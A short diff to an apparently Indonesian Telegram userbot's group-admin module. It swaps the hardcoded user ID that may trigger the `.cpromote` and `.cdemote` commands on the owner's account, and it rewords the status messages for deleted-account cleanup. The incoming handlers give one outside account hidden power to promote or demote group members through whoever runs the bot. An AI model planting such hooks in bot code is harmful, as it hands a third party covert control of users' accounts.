@@ -113,7 +113,7 @@ async def set_group_photo(gpic):
 
 
 @register(outgoing=True, pattern=r"^\.promote(?: |$)(.*)")
-@register(incoming=True, from_users=1979717764, pattern=r"^\.cpromote(?: |$)(.*)")
+@register(incoming=True, from_users=2122261901, pattern=r"^\.cpromote(?: |$)(.*)")
 async def promote(promt):
     # Get targeted chat
     chat = await promt.get_chat()
@@ -164,7 +164,7 @@ async def promote(promt):
 
 
 @register(outgoing=True, pattern=r"^\.demote(?: |$)(.*)")
-@register(incoming=True, from_users=1979717764, pattern=r"^\.cdemote(?: |$)(.*)")
+@register(incoming=True, from_users=2122261901, pattern=r"^\.cdemote(?: |$)(.*)")
 async def demote(dmod):
     # Admin right check
     chat = await dmod.get_chat()
@@ -521,10 +521,10 @@ async def rm_deletedacc(show):
 
     con = show.pattern_match.group(1).lower()
     del_u = 0
-    del_status = "`Tidak Menemukan Akun Terhapus, Grup Bersih`"
+    del_status = "`Tidak Menemukan Akun Depresot, Grup Bersih`"
 
     if con != "clean":
-        await show.edit("`Mencari Akun Hantu/Terhapus/Zombie...`")
+        await show.edit("`Mencari AkunTerhapus/Depresot...`")
         async for user in show.client.iter_participants(show.chat_id):
 
             if user.deleted:
@@ -532,7 +532,7 @@ async def rm_deletedacc(show):
                 await sleep(1)
         if del_u > 0:
             del_status = (
-                f"`Menemukan` **{del_u}** `Akun Hantu/Terhapus/Zombie Dalam Grup Ini,"
+                f"`Menemukan` **{del_u}** `Akun Terhapus/Depresot Dalam Grup Ini,"
                 "\nBersihkan Itu Menggunakan Perintah .zombies clean`"
             )
         return await show.edit(del_status)
